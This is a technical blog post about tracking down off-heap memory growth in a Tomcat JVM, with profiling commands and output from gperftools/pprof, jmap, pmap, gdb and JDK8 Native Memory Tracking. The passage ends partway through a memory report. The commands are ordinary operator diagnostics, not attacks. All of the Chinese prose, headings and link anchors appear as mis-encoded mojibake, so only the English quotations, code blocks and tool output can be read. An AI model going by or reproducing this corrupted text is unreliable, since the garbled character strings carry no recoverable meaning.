<p>jvmæœ€å¤§çš„å †åªæœ‰44GBï¼Œ ä½†æ˜¯ä»ä¸Šé¢çš„æ—¥å¿—ä¸­çœ‹åˆ°å®é™…å ç”¨çš„å†…å­˜è¾¾åˆ°äº†62GBï¼Œå‡ ä¹æŠŠæ•´ä¸ªç³»ç»Ÿçš„å†…å­˜éƒ½åƒæ‰äº†ã€‚<br>æ—¢ç„¶å †å†…æ²¡æœ‰é—®é¢˜ï¼Œé—®é¢˜è‡ªç„¶åº”è¯¥å‡ºåœ¨å †å¤–å†…å­˜çš„å ç”¨ä¸Šã€‚</p>
<h2 id="java-å †å¤–å†…å­˜"><a href="#java-å †å¤–å†…å­˜" class="headerlink" title="java å †å¤–å†…å­˜"></a>java å †å¤–å†…å­˜</h2><p><a href="http://lovestblog.cn/blog/2015/05/12/direct-buffer/" rel="external nofollow noopener noreferrer" target="_blank">JVMæºç åˆ†æä¹‹å †å¤–å†…å­˜å®Œå…¨è§£è¯» - ä½ å‡ç¬¨</a> ä¸­è¯´é“ï¼š</p>
<blockquote>
<p>å¯¹äºSystem.gcçš„å®ç°ï¼Œä¹‹å‰å†™äº†ä¸€ç¯‡æ–‡ç« æ¥é‡ç‚¹ä»‹ç»ï¼ŒJVMæºç åˆ†æä¹‹SystemGCå®Œå…¨è§£è¯»ï¼Œå®ƒä¼šå¯¹æ–°ç”Ÿä»£çš„è€ç”Ÿä»£éƒ½ä¼šè¿›è¡Œå†…å­˜å›æ”¶ï¼Œè¿™æ ·ä¼šæ¯”è¾ƒå½»åº•åœ°å›æ”¶DirectByteBufferå¯¹è±¡ä»¥åŠä»–ä»¬å…³è”çš„å †å¤–å†…å­˜ï¼Œæˆ‘ä»¬dumpå†…å­˜å‘ç°DirectByteBufferå¯¹è±¡æœ¬èº«å…¶å®æ˜¯å¾ˆå°çš„ï¼Œä½†æ˜¯å®ƒåé¢å¯èƒ½å…³è”äº†ä¸€ä¸ªéå¸¸å¤§çš„å †å¤–å†…å­˜ï¼Œå› æ­¤æˆ‘ä»¬é€šå¸¸ç§°ä¹‹ä¸ºã€å†°å±±å¯¹è±¡ã€ï¼Œæˆ‘ä»¬åšygcçš„æ—¶å€™ä¼šå°†æ–°ç”Ÿä»£é‡Œçš„ä¸å¯è¾¾çš„DirectByteBufferå¯¹è±¡åŠå…¶å †å¤–å†…å­˜å›æ”¶äº†ï¼Œä½†æ˜¯æ— æ³•å¯¹oldé‡Œçš„DirectByteBufferå¯¹è±¡åŠå…¶å †å¤–å†…å­˜è¿›è¡Œå›æ”¶ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬é€šå¸¸ç¢°åˆ°çš„æœ€å¤§çš„é—®é¢˜ï¼Œå¦‚æœæœ‰å¤§é‡çš„DirectByteBufferå¯¹è±¡ç§»åˆ°äº†oldï¼Œä½†æ˜¯åˆä¸€ç›´æ²¡æœ‰åšcms gcæˆ–è€…full gcï¼Œè€Œåªè¿›è¡Œygcï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„ç‰©ç†å†…å­˜å¯èƒ½è¢«æ…¢æ…¢è€—å…‰ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜ä¸çŸ¥é“å‘ç”Ÿäº†ä»€ä¹ˆï¼Œå› ä¸ºheapæ˜æ˜å‰©ä½™çš„å†…å­˜è¿˜å¾ˆå¤š(å‰ææ˜¯æˆ‘ä»¬ç¦ç”¨äº†System.gc)ã€‚</p>
</blockquote>
<p>ç™½è¡£å¤§ä¾ ä¹Ÿå»ºè®®ï¼š</p>
<blockquote>
<p>è¿™æ—¶ï¼Œå°±åªèƒ½é å‰é¢æåˆ°çš„ç”³è¯·é¢åº¦è¶…é™æ—¶è§¦å‘çš„system.gc()æ¥æ•‘åœºäº†ã€‚ä½†è¿™é“æœ€åçš„ä¿é™©å…¶å®ä¹Ÿä¸å¾ˆå¥½ï¼Œé¦–å…ˆå®ƒä¼šä¸­æ–­æ•´ä¸ªè¿›ç¨‹ï¼Œç„¶åå®ƒè®©å½“å‰çº¿ç¨‹ç¡äº†æ•´æ•´ä¸€ç™¾æ¯«ç§’ï¼Œè€Œä¸”å¦‚æœgcæ²¡åœ¨ä¸€ç™¾æ¯«ç§’å†…å®Œæˆï¼Œå®ƒä»ç„¶ä¼šæ— æƒ…çš„æŠ›å‡ºOOMå¼‚å¸¸ã€‚è¿˜æœ‰ï¼Œä¸‡ä¸€ï¼Œä¸‡ä¸€å¤§å®¶è¿·ä¿¡æŸä¸ªè°ƒä¼˜æŒ‡å—è®¾ç½®äº†-DisableExplicitGCç¦æ­¢äº†system.gc()ï¼Œé‚£å°±ä¸å¥½ç©äº†ã€‚<br>æ‰€ä»¥ï¼Œå †å¤–å†…å­˜è¿˜æ˜¯è‡ªå·±ä¸»åŠ¨ç‚¹å›æ”¶æ›´å¥½ï¼Œæ¯”å¦‚Nettyå°±æ˜¯è¿™ä¹ˆåšçš„ã€‚</p>
</blockquote>
<h3 id="é™åˆ¶å †å¤–å†…å­˜çš„å¤§å°"><a href="#é™åˆ¶å †å¤–å†…å­˜çš„å¤§å°" class="headerlink" title="é™åˆ¶å †å¤–å†…å­˜çš„å¤§å°"></a>é™åˆ¶å †å¤–å†…å­˜çš„å¤§å°</h3><p>åŠ ä¸Š<code>-XX:MaxDirectMemorySize=4g</code>ï¼Œ å»é™¤<code>-XX:+DisableExplicitG</code>è§‚å¯Ÿäº†å‡ å¤©ï¼Œå‘ç°å¹¶ä¸èƒ½è§£å†³é—®é¢˜ï¼Œäºæ˜¯ç»§ç»­ä½¿ç”¨<code>google perf tools</code>å»è§‚å¯Ÿä¸‹å †å¤–å†…å­˜çš„ä½¿ç”¨</p>
<h2 id="google-perf-tools"><a href="#google-perf-tools" class="headerlink" title="google perf tools"></a>google perf tools</h2><p><a href="https://github.com/gperftools/gperftools/tree/master" rel="external nofollow noopener noreferrer" target="_blank">ä¸‹è½½åœ°å€</a></p>
<h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><blockquote>
<p>è¯¥å·¥å…·ä¸»è¦åˆ©ç”¨äº†unixçš„ä¸€ä¸ªç¯å¢ƒå˜é‡LD_PRELOADï¼Œå®ƒå…è®¸ä½ è¦åŠ è½½çš„åŠ¨æ€åº“ä¼˜å…ˆåŠ è½½èµ·æ¥ï¼Œç›¸å½“äºä¸€ä¸ªHookäº†ï¼Œ<br>äºæ˜¯å¯ä»¥é’ˆå¯¹åŒä¸€ä¸ªå‡½æ•°å¯ä»¥é€‰æ‹©ä¸åŒçš„åŠ¨æ€åº“é‡Œçš„å®ç°äº†ï¼Œæ¯”å¦‚googleperftoolså°±æ˜¯å°†mallocæ–¹æ³•æ›¿æ¢æˆäº†tcmallocçš„å®ç°ï¼Œè¿™æ ·å°±å¯ä»¥è·Ÿè¸ªå†…å­˜åˆ†é…è·¯å¾„äº†</p>
</blockquote>
<h3 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h3><p><code>tomcat</code>çš„å¯åŠ¨å˜é‡ä¸­åŠ å…¥ä¸‹é¢çš„é…ç½®<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> LD_PRELOAD=/usr/<span class="built_in">local</span>/lib/libtcmalloc.so</span><br><span class="line"><span class="built_in">export</span> HEAPPROFILE=/home/q/perf-result/</span><br><span class="line"><span class="built_in">export</span> HEAP_PROFILE_ALLOCATION_INTERVAL=2000000000</span><br></pre></td></tr></table></figure></p>
<p>HEAPPROFILEæ˜¯å­˜æ”¾ç»“æœçš„åœ°å€</p>
<blockquote>
<p>HEAP_PROFILE_ALLOCATION_INTERVAL    default: 1073741824 (1 Gb)    Dump heap profiling information once every specified number of bytes has been allocated by the program.</p>
</blockquote>
<p>æŸ¥çœ‹è¿è¡Œä¸­çš„æ—¥å¿—:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dumping heap profile to /home/q/perf-result/_23207.0927.heap (1755151 MB allocated cumulatively, 1267 MB currently in use)</span><br></pre></td></tr></table></figure></p>
<p>æ—¥å¿—ä¸­ä¼šæ˜¾ç¤ºç´¯è®¡çš„å¯¹å¤–å†…å­˜çš„åˆ†é…å’Œå½“å‰ä½¿ç”¨çš„å †å¤–å†…å­˜çš„å¤§å°ã€‚</p>
<h3 id="åˆ†æç»“æœ"><a href="#åˆ†æç»“æœ" class="headerlink" title="åˆ†æç»“æœ"></a>åˆ†æç»“æœ</h3><h4 id="æ–‡æœ¬å½¢å¼çš„"><a href="#æ–‡æœ¬å½¢å¼çš„" class="headerlink" title="æ–‡æœ¬å½¢å¼çš„"></a>æ–‡æœ¬å½¢å¼çš„</h4><p>å‘½ä»¤ï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/<span class="built_in">local</span>/bin/pprof --text /home/q/java/default/bin/java _23207.0035.heap</span><br></pre></td></tr></table></figure></p>
<p>è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Using local file /home/q/java/default/bin/java.</span><br><span class="line">Using local file _23207.1012.heap.</span><br><span class="line">Total: 1283.1 MB</span><br><span class="line"></span><br><span class="line">     0.0   0.0% 100.0%     39.5   3.1% PtrQueue::enqueue_known_active</span><br><span class="line">     0.0   0.0% 100.0%     39.5   3.1% PtrQueueSet::allocate_buffer</span><br><span class="line">     0.0   0.0% 100.0%     42.2   3.3% G1ParTask::work</span><br><span class="line">     0.0   0.0% 100.0%     42.2   3.3% GangWorker::loop</span><br><span class="line">     0.0   0.0% 100.0%     75.6   5.9% ObjArrayKlass::oop_oop_iterate_nv_m@8fbe80</span><br><span class="line">     0.0   0.0% 100.0%    146.2  11.4% 0x00007f63bf0e5825</span><br><span class="line">     0.0   0.0% 100.0%    146.2  11.4% JVM_InternString</span><br><span class="line">     0.0   0.0% 100.0%    146.2  11.4% StringTable::intern@a24ca0</span><br><span class="line">     0.0   0.0% 100.0%    147.2  11.5% StringTable::basic_add</span><br><span class="line">     0.0   0.0% 100.0%    147.3  11.5% StringTable::intern@a24780</span><br><span class="line">     0.0   0.0% 100.0%    152.4  11.9% Hashtable::new_entry</span><br><span class="line">     0.0   0.0% 100.0%    170.5  13.3% AllocateHeap</span><br><span class="line">     0.0   0.0% 100.0%    256.0  20.0% ConcurrentMark::ConcurrentMark</span><br><span class="line">     0.0   0.0% 100.0%    265.5  20.7% InstanceKlass::oop_oop_iterate_nv</span><br><span class="line">     0.0   0.0% 100.0%    287.2  22.4% G1CollectedHeap::initialize</span><br><span class="line">     0.0   0.0% 100.0%    305.4  23.8% Universe::initialize_heap</span><br><span class="line">     0.0   0.0% 100.0%    306.3  23.9% universe_init</span><br><span class="line">     0.0   0.0% 100.0%    307.0  23.9% init_globals</span><br><span class="line">     0.0   0.0% 100.0%    307.1  23.9% JNI_CreateJavaVM</span><br><span class="line">     0.0   0.0% 100.0%    307.1  23.9% Threads::create_vm</span><br><span class="line">     0.0   0.0% 100.0%    307.2  23.9% JavaMain</span><br><span class="line">     0.0   0.0% 100.0%    326.5  25.4% ConcurrentG1RefineThread::run</span><br><span class="line">     0.0   0.0% 100.0%    326.5  25.4% RefineCardTableEntryClosure::do_card_ptr</span><br><span class="line">     0.0   0.0% 100.0%    329.8  25.7% 0x00007f63bfae74a7</span><br><span class="line">     0.0   0.0% 100.0%    348.5  27.2% DirtyCardQueueSet::apply_closure_to_completed_buffer</span><br><span class="line">     0.0   0.0% 100.0%    349.7  27.3% G1RemSet::refine_card</span><br><span class="line">     0.0   0.0% 100.0%    349.7  27.3% HeapRegion::oops_on_card_seq_iterate_careful</span><br><span class="line">     0.0   0.0% 100.0%    349.7  27.3% OtherRegionsTable::add_reference</span><br><span class="line">     0.0   0.0% 100.0%    351.0  27.4% os::malloc@913e80</span><br><span class="line">     0.0   0.0% 100.0%    351.0  27.4% Unsafe_AllocateMemory</span><br><span class="line">     0.0   0.0% 100.0%    408.4  31.8% java_start</span><br><span class="line">     0.0   0.0% 100.0%    562.6  43.8% BitMap::resize</span><br><span class="line">     0.0   0.0% 100.0%    598.5  46.6% ArrayAllocator::allocate</span><br><span class="line">     0.0   0.0% 100.0%    715.5  55.8% __clone</span><br><span class="line">     0.0   0.0% 100.0%    715.5  55.8% start_thread</span><br><span class="line">  1277.3  99.5%  99.5%   1277.3  99.5% os::malloc@9137e0</span><br></pre></td></tr></table></figure>
<p>ç»“æœä»£è¡¨çš„å«ä¹‰:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Analyzing Text Output</span><br><span class="line"></span><br><span class="line">Text mode has lines of output that look like this:</span><br><span class="line"></span><br><span class="line">       14   2.1%  17.2%       58   8.7% std::_Rb_tree::find</span><br><span class="line">Here is how to interpret the columns:</span><br><span class="line"></span><br><span class="line">1. Number of profiling samples in this function</span><br><span class="line">2. Percentage of profiling samples in this function</span><br><span class="line">3. Percentage of profiling samples in the functions printed so far</span><br><span class="line">4. Number of profiling samples in this function and its callees</span><br><span class="line">5. Percentage of profiling samples in this function and its callees</span><br><span class="line">6. Function name</span><br></pre></td></tr></table></figure>
<p><a href="https://gperftools.github.io/gperftools/cpuprofile.html" rel="external nofollow noopener noreferrer" target="_blank">Gperftools CPU Profiler</a>ä¸­æœ‰æ›´åŠ è¯¦ç»†çš„è¯´æ˜</p>
<h4 id="pdfå½¢å¼çš„ç»“æœ"><a href="#pdfå½¢å¼çš„ç»“æœ" class="headerlink" title="pdfå½¢å¼çš„ç»“æœ"></a>pdfå½¢å¼çš„ç»“æœ</h4><p>ç›¸æ¯”æ–‡å­—çš„ç»“æœï¼Œå›¾ç‰‡å½¢å¼çš„è°ƒç”¨å…³ç³»ï¼Œæ›´åŠ æ¸…æ¥šå’Œç›´è§‚ã€‚</p>
<p>å‘½ä»¤å¦‚ä¸‹:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install ghostscript</span><br><span class="line">sudo yum install dot</span><br><span class="line">sudo yum install graphviz -y</span><br><span class="line">sudo pprof --pdf  /home/q/java/default/bin/java _19877.19793.heap &gt; result.pdf</span><br></pre></td></tr></table></figure>
<p>ç»“æœï¼š</p>


	<div class="row">
    <embed src="result.pdf" width="100%" height="550" type="application/pdf">
	</div>



<h2 id="å¯èƒ½çš„åŸå› "><a href="#å¯èƒ½çš„åŸå› " class="headerlink" title="å¯èƒ½çš„åŸå› "></a>å¯èƒ½çš„åŸå› </h2><p>ä»google perf toolsçš„ç»“æœæ¥çœ‹ä¸»è¦çš„å †å¤–å†…å­˜æ¥è‡ª</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x00007f52e05126a5</span><br><span class="line">0.0 (0.0%)</span><br><span class="line">of 7089.3 (82.5%)</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªå†å¾€ä¸Šå°±æ²¡æœ‰åœ°å€äº†ã€‚</p>
<h3 id="heap-å ç”¨"><a href="#heap-å ç”¨" class="headerlink" title="heap å ç”¨"></a>heap å ç”¨</h3><p>æŸ¥çœ‹å‡ºé—®é¢˜æœºå™¨çš„<code>heap</code>å ç”¨æƒ…å†µå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">jmap -histo:live `pgrep -f &apos;tomcat&apos;`</span><br><span class="line"></span><br><span class="line"> num     #instances         #bytes  class name</span><br><span class="line"></span><br><span class="line">----------------------------------------------</span><br><span class="line"></span><br><span class="line">   1:      15272979      940261992  [C</span><br><span class="line"></span><br><span class="line">   2:      19182959      767318360  java.util.ArrayList</span><br><span class="line"></span><br><span class="line">   3:      15397474      739078752  qunar.tc.plato.zeno.util.collections.offheap.map.OffHeapHashMap</span><br><span class="line"></span><br><span class="line">   4:      13281544      637514112  java.util.concurrent.ConcurrentHashMap$Node</span><br><span class="line"></span><br><span class="line">   5:      10136730      612997544  [Ljava.lang.Object;</span><br><span class="line"></span><br><span class="line">   6:      15265576      488498432  java.lang.String</span><br><span class="line"></span><br><span class="line">   7:       4694324      413100512  _plato.com.qunar.hotel.price.data.center.plato.beans.shotel.IMetaSHotelBizInfo</span><br><span class="line"></span><br><span class="line">   8:           854      379525944  [Ljava.util.concurrent.ConcurrentHashMap$Node;</span><br><span class="line"></span><br><span class="line">   9:      15397474      369539376  qunar.tc.plato.zeno.util.collections.offheap.set.OffHeapHashSet</span><br><span class="line"></span><br><span class="line">  10:       4694324      337991328  _plato.com.qunar.hotel.price.data.center.plato.beans.shotel.IMetaContactConfig</span><br></pre></td></tr></table></figure>
<p>å‰é¢çš„éƒ½æ˜¯å»å“ªå„¿è‡ªå·±å¼€å‘çš„å †å¤–ç¼“å­˜å ç”¨çš„å¯¹è±¡ï¼Œç¼“å­˜çš„å†…å®¹ä¹Ÿå¤šæ˜¯é…’åº—ç›¸å…³çš„å…ƒæ•°æ®ã€‚ç»“åˆå·¥å…·çš„ç»“æœï¼Œæ¨æµ‹é—®é¢˜å‡ºåœ¨å †å¤–ç¼“å­˜ã€‚<br>å †å¤–ç¼“å­˜é‡‡ç”¨çš„æ˜¯å†…å­˜æ˜ å°„çš„æ–¹å¼ï¼Œå¤§é‡ä½¿ç”¨äº†<code>DirectByteBuffer</code>è¿™ç§å†°å±±å¯¹è±¡ã€‚</p>
<h3 id="ç–‘ç‚¹"><a href="#ç–‘ç‚¹" class="headerlink" title="ç–‘ç‚¹"></a>ç–‘ç‚¹</h3><p>è¿™ä¸ªç³»ç»Ÿç›®å‰å¤„äºé‡æ„é˜¶æ®µï¼Œä¹‹å‰ä¹Ÿæ˜¯ä½¿ç”¨çš„å †å¤–ç¼“å­˜ï¼Œå¹¶æ²¡æœ‰å‡ºç°é—®é¢˜ã€‚ä¸è¿‡ï¼Œç›®å‰åœ¨é€æ¸ä¸‹æ‰å †å¤–ç¼“å­˜çš„ä½¿ç”¨ï¼Œåˆ°æ—¶å€™å¯ä»¥å†çœ‹çœ‹æ˜¯å¦å‡ºé—®é¢˜ã€‚</p>
<h2 id="æ‚è°ˆ"><a href="#æ‚è°ˆ" class="headerlink" title="æ‚è°ˆ"></a>æ‚è°ˆ</h2><h3 id="ä½¿ç”¨pmapæŸ¥çœ‹è¿›ç¨‹çš„å†…å­˜æ˜ å°„"><a href="#ä½¿ç”¨pmapæŸ¥çœ‹è¿›ç¨‹çš„å†…å­˜æ˜ å°„" class="headerlink" title="ä½¿ç”¨pmapæŸ¥çœ‹è¿›ç¨‹çš„å†…å­˜æ˜ å°„"></a>ä½¿ç”¨pmapæŸ¥çœ‹è¿›ç¨‹çš„å†…å­˜æ˜ å°„</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">sudo -u tomcat pmap -x  25147 | less</span><br><span class="line"></span><br><span class="line">Address           Kbytes     RSS   Dirty Mode   Mapping</span><br><span class="line">0000000000400000       4       0       0 r-x--  java</span><br><span class="line">0000000000600000       4       4       4 rw---  java</span><br><span class="line">0000000001d3f000    1484    1224    1224 rw---    [ anon ]</span><br><span class="line">0000003e0a400000     128     112       0 r-x--  ld-2.12.so</span><br><span class="line">0000003e0a61f000       4       4       4 r----  ld-2.12.so</span><br><span class="line">0000003e0a620000       4       4       4 rw---  ld-2.12.so</span><br><span class="line">0000003e0a621000       4       4       4 rw---    [ anon ]</span><br><span class="line">0000003e0a800000       8       8       0 r-x--  libdl-2.12.so</span><br><span class="line">0000003e0a802000    2048       0       0 -----  libdl-2.12.so</span><br><span class="line">0000003e0aa02000       4       4       4 r----  libdl-2.12.so</span><br><span class="line">0000003e0aa03000       4       4       4 rw---  libdl-2.12.so</span><br><span class="line">0000003e0ac00000    1576     680       0 r-x--  libc-2.12.so</span><br><span class="line">0000003e0ad8a000    2048       0       0 -----  libc-2.12.so</span><br><span class="line">0000003e0af8a000      16      16       8 r----  libc-2.12.so</span><br><span class="line">0000003e0af8e000       4       4       4 rw---  libc-2.12.so</span><br><span class="line">0000003e0af8f000      20      20      20 rw---    [ anon ]</span><br><span class="line">0000003e0b000000      92      72       0 r-x--  libpthread-2.12.so</span><br><span class="line">0000003e0b017000    2048       0       0 -----  libpthread-2.12.so</span><br><span class="line">0000003e0b217000       4       4       4 r----  libpthread-2.12.so</span><br><span class="line">0000003e0b218000       4       4       4 rw---  libpthread-2.12.so</span><br><span class="line">0000003e0b219000      16       4       4 rw---    [ anon ]</span><br></pre></td></tr></table></figure>
<p>å°†å†…å­˜å—çš„å†…å®¹dumpæˆæ–‡ä»¶ï¼ˆæ…é‡ï¼Œä¼šå½±å“æœåŠ¡ï¼‰<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo  gdb --batch --pid 25147 -ex &quot; dump memory /home/qisheng.li/c.dump 0x00007eefcc000000 0x00007eefcf000000&quot;</span><br></pre></td></tr></table></figure></p>
<p>æŸ¥çœ‹æ–‡ä»¶çš„å†…å®¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@xxx.h.cn2 ~]$ view c.dump</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªdumpæ˜¯æˆ‘åœ¨<code>2017å¹´ 09æœˆ 05æ—¥ æ˜ŸæœŸäºŒ 01:34:24 CST</code>åšçš„ï¼Œä½†æ˜¯å†…å®¹çœ‹èµ·æ¥æ˜¯tomcat responeçš„å†…å®¹ï¼Œå¥‡æ€ªçš„æ˜¯å†…å®¹çš„æ—¶é—´æ˜¯<code>2017 17:38:18 GMT</code>ï¼Œä¸çŸ¥é“æ˜¯ä»€ä¹ˆåŸå› å¯¼è‡´çš„ï¼Œå¦‚æœä½ çŸ¥é“ï¼Œçƒ¦è¯·å‘ŠçŸ¥ã€‚</p>
<p>ç›´æ¥æŸ¥çœ‹å †å¤–çš„å†…å­˜å—ï¼Œæ— ç–‘æ˜¯æœ€å¿«æ’æŸ¥å †å¤–å ç”¨çš„æ–¹æ³•ï¼Œä½†æ˜¯å†…å­˜å—çš„é€‰æ‹©éå¸¸ä¾èµ–ç»éªŒï¼Œ æˆ‘å°è¯•äº†ä¸‹ï¼Œå¹¶æ²¡æœ‰æ‰¾åˆ°é—®é¢˜ã€‚</p>
<p><code>å‚è€ƒ5</code>ä¸­çš„å¤§ç¥ï¼Œé€šè¿‡dumpå†…å­˜å—ï¼Œå‘ç°æ˜¯nettyä½¿ç”¨çš„<code>directBuffer</code>åˆ†é…çš„å¤§é‡64Mçš„å†…å­˜å—ã€‚</p>
<h4 id="JDK8ä¸­çš„-Native-Memory-Tracker"><a href="#JDK8ä¸­çš„-Native-Memory-Tracker" class="headerlink" title="JDK8ä¸­çš„ Native Memory Tracker"></a>JDK8ä¸­çš„ Native Memory Tracker</h4><p>åœ¨å¯åŠ¨å‚æ•°ä¸­å¼€å¯ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-XX:NativeMemoryTracking=[off | summary | detail]</span><br></pre></td></tr></table></figure></p>
<p>ä¹Ÿå¯ä»¥åœ¨jvmé€€å‡ºçš„æ—¶å€™ï¼Œæ‰“å°ç›¸å…³çš„ç»Ÿè®¡ä¿¡æ¯</p>
<blockquote>
<p>NMT at VM Exit<br>Use the following VM diagnostic command line option to obtain last memory usage data at VM exit when Native Memory Tracking is enabled. The level of detail is based on tracking level.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-XX:+UnlockDiagnosticVMOptions -XX:+PrintNMTStatistics</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>åœ¨ç¨‹åºè¿è¡Œæ—¶å¯ä»¥ä½¿ç”¨<code>jcmd</code>æŸ¥çœ‹å†…å­˜çš„åˆ†é…æƒ…å†µ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jcmd &lt;pid&gt; VM.native_memory [summary | detail | baseline | summary.diff | detail.diff | shutdown] [scale= KB | MB | GB]</span><br></pre></td></tr></table></figure></p>
<p>è¾“å‡ºçš„ç»“æœ:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sudo -u tomcat jcmd `pgrep -f tomcat` VM.native_memory detail</span><br><span class="line">31549:</span><br><span class="line"></span><br><span class="line">Native Memory Tracking:</span><br><span class="line"></span><br><span class="line">Total: reserved=50215227KB, committed=49947839KB</span><br><span class="line">-                 Java Heap (reserved=46137344KB, committed=46137344KB)</span><br><span class="line">                            (mmap: reserved=46137344KB, committed=46137344KB) </span><br><span class="line"> </span><br><span class="line">-                     Class (reserved=92639KB, committed=91707KB)</span><br><span class="line">                            (classes #14958)</span><br><span class="line">                            (malloc=2527KB #50184) </span><br><span class="line">                            (mmap: reserved=90112KB, committed=89180KB) </span><br><span class="line"> </span><br><span class="line">-                    Thread (reserved=914804KB, committed=914804KB)</span><br><span class="line">                            (thread #883)</span><br><span class="line">                            (stack: reserved=906696KB, committed=906696KB)</span><br><span class="line">                            (malloc=2904KB #4435) </span><br><span class="line">                            (arena=5203KB #1764)</span><br><span class="line"> 